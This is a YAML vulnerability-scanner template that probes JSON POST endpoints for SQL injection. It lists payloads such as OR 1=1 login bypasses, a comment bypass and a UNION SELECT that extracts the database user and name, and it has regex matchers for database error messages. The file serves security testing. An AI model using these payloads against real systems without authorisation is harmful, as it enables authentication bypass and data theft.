id: generic-sqli-post-json
info:
  name: SQL Injection (POST/JSON)
  severity: critical
  description: Generic SQL injection testing for POST/JSON bodies - detects all types automatically
  tags:
    - sqli
    - injection
    - json
    - generic

generic:
  endpoint: "{{sqli_post}}"
  method: POST
  content_type: "application/json"
  body_template: '{"{{parameter}}": "{{payload}}"}'
  parameter: "username"

  payloads:
    - name: "single_quote"
      value: "'"

    - name: "or_bypass"
      value: "' OR '1'='1"

    - name: "login_bypass"
      value: "' OR 1=1-- -"

    - name: "union_select"
      value: "' UNION SELECT NULL,user(),database()-- -"

    - name: "comment_bypass"
      value: "admin'--"

    - name: "boolean_or"
      value: "' OR '1'='1'--"

  matchers:
    # SQL error messages
    - type: regex
      regex:
        - "SQL syntax.*?near"
        - "mysql_fetch.*?error"
        - "Warning.*?mysql_"
        - "ORA-\\d{5}"
        - "PostgreSQL.*?ERROR"
        - "SQLite3::SQLException"
        - "SQLSTATE\\["
        - "Unclosed quotation mark"
        - "Incorrect syntax near"

    # Database function output
    - type: regex
      regex:
        - "@@version\\s*[0-9]"
        - "version\\(\\)\\s*[0-9]"
        - "database\\(\\)"

    # Exclude HTML pages
    - type: word
      words:
        - "<!DOCTYPE html"
        - "<html>"
      negative: true
